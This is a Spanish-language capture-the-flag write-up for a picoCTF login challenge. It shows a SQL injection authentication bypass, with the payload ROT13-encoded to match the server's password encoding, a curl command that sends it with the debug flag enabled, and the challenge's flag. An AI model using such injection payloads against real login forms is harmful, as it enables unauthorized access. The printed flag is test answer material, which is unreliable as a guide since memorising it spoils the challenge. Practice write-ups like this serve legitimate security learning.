## Descripción 
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Datos de Acceso al Nivel
user: carlosof
password:

## Solución 1

- Ingresamos al link de la pagina y nos dirigimos a la parte del login del admin.
- Inspeccionamos la pagina web y  en el `<input type="hidden" name="debug" value="0">` cambiamos el valor a 1.
- Al tratar de ingresa la  inyección `'or 1=1;`, nos regresa lo siguiente:
```
password: 'or 1=1;
SQL query: SELECT * FROM admin where password = ' be 1=1;
```
- Sabiendo por una las pistas que la password se encripta, ingresamos `hola mundo` para ver el comportamiento y regresa lo siguiente: 
```
password: hola mundo
SQL query: SELECT * FROM admin where password = 'ubyn zhaqb'

# Login failed.
```

- Ingresamos a la pagina cyberchef (sospechamos que muy probablemente esta encriptada por ROT13)  e ingresamos lo que nos devolvió la primera inyección `' be 1=1;` 
- Confirmamos que ese es el cifrado.
- Copiamos `' be 1=1;` y lo ingresamos como la password.

```
password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```

## Solución 2

```bash
carlosof-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/40742/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>carlosof-picoctf@webshell:~$ 

```


## Notas Adicionales


## Referencias 
https://play.picoctf.org/practice/challenge/8
[CyberChef](https://latam.kaspersky.com/resource-center/definitions/sql-injection?srsltid=AfmBOootRM9cCI88fJV0m7V-OOrzjB2Z5qBP-J1De9j-ZjM5AXJLUxk0)
https://es.wikipedia.org/wiki/ROT13